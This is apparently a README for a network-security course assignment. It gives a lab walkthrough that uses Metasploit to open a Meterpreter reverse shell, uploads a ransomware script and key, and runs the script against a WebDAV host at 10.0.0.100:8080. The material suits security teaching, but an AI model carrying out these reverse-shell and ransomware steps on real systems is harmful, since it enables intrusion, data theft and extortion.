# Netsec

Practical assignment #2 for Network Security

## Running
```sh
nix run .#run
```
Gets you into the VM. Once there:

```sh
sudo sh setup.sh
sudo nixos-container start attacker
sudo nixos-container login attacker
# now inside attacker container
mkdir victim/
rclone webdav victim/ --addr :8080
sudo msfconsole --defer-module-load -r preload.rc # to get into metasploit
# inside metasploit
exploit
# inside the meterpreter reverse shell
upload bash/ransom.sh bash/pk.pem /
cd /
shell
sh ransom.sh 10.0.0.100:8080
# ransomware started!

```

## Notice
All keypairs in this repo are not used anywhere else.

